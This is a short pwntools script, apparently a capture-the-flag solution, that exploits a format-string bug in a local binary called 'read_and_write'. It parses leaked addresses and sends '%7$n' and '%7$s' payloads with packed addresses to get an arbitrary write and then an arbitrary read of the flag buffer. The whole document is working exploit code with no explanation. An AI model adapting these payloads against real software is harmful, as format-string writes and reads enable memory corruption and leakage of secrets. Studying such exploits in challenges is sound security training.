from pwn import *
from pwn import p64

context.log_level = "error"
pros = process("./read_and_write")

pros.recvuntil(b"at : ")
var_addr = int(pros.recvline().strip(), 16)

# ARBITRARY WRITE :

payload = b"AAA%7$nA"
payload += p64(var_addr)
pros.sendline(payload)

pros.recvuntil(b"Your flag is at : ")
buff_addr = int(pros.recvline().strip(), 16)

# ARBITRARY READ :

payload = b"%7$sAAAA"
payload += p64(buff_addr)
pros.sendline(payload)

pros.interactive()
